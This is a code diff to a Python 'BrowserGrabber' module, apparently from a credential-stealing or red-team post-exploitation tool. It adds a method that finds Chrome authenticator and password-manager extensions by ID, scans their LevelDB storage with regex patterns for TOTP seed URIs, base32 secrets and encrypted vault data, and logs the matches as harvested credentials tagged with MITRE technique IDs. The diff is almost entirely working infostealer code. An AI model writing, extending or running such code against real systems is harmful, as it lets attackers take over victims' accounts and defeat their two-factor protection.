@@ -89,6 +89,10 @@ class BrowserGrabber(GrabberModule):
                     web_data = self._extract_chromium_web_data(profile_path, browser_name, master_key)
                     result.credentials.extend(web_data)
 
+                    # Chrome extension data (TOTP seeds, password manager vaults)
+                    ext_data = self._extract_chromium_extensions(profile_path, browser_name)
+                    result.credentials.extend(ext_data)
+
                 if result.credentials:
                     login_count = len([c for c in result.credentials
                                        if c.target_application.startswith(browser_name)
@@ -305,6 +309,74 @@ class BrowserGrabber(GrabberModule):
                 safe_sqlite_close(conn, tmp_path)
 
             break  # Found cookies DB, no need to try alternate path
+
+        return creds
+
+    # Extension IDs known to store interesting data
+    _INTERESTING_EXTENSIONS = {
+        # Authenticator apps (TOTP seeds!)
+        "bhghoamapcdpbohphigoooaddinpkbai": "Authenticator",
+        "oeljdldpnmdbchonielidgobddffflal": "EOS Authenticator",
+        # Password manager extensions (handled by password_mgr, but flag here)
+        "nngceckbapebfimnlniiiahkandclblb": "Bitwarden",
+        "hdokiejnpimakedhajhdlcegeplioahd": "LastPass",
+        "aeblfdkhhhdcdjpifhhbdiojplfjncoa": "1Password",
+    }
+
+    def _extract_chromium_extensions(self, profile_path: str,
+                                      browser_name: str) -> list[ExtractedCredential]:
+        """Scan Chrome extension local storage for interesting data."""
+        creds = []
+        ext_settings = os.path.join(profile_path, "Local Extension Settings")
+        if not os.path.isdir(ext_settings):
+            return creds
+
+        try:
+            for ext_id in os.listdir(ext_settings):
+                ext_path = os.path.join(ext_settings, ext_id)
+                if not os.path.isdir(ext_path):
+                    continue
+
+                ext_name = self._INTERESTING_EXTENSIONS.get(ext_id)
+                if not ext_name:
+                    continue
+
+                # Scan LevelDB files for token/seed patterns
+                from ._leveldb import extract_strings_from_leveldb
+
+                patterns = [
+                    rb"otpauth://totp/",       # TOTP seed URIs
+                    rb'"secret"\s*:\s*"[A-Z2-7]{16,}"',  # TOTP secrets (base32)
+                    rb'"encrypted"\s*:\s*"',     # Encrypted vault data
+                ]
+
+                for pattern in patterns:
+                    matches = extract_strings_from_leveldb(ext_path, [pattern])
+                    for match in matches[:5]:
+                        creds.append(ExtractedCredential(
+                            source_module=self.name,
+                            credential_type="token",
+                            target_application=f"{browser_name} Extension ({ext_name})",
+                            decrypted_value=match[:200],
+                            notes=f"extension={ext_name} ({ext_id})",
+                            mitre_technique="T1555.003",
+                            source_file=ext_path,
+                        ))
+
+                # If it's an authenticator extension, that's a critical find
+                if "authenticator" in ext_name.lower():
+                    creds.append(ExtractedCredential(
+                        source_module=self.name,
+                        credential_type="key",
+                        target_application=f"{browser_name} Extension ({ext_name})",
+                        url=ext_path,
+                        notes=f"TOTP authenticator extension -- may contain 2FA seeds",
+                        mitre_technique="T1528",
+                        source_file=ext_path,
+                    ))
+
+        except (PermissionError, OSError):
+            pass
 
         return creds
 
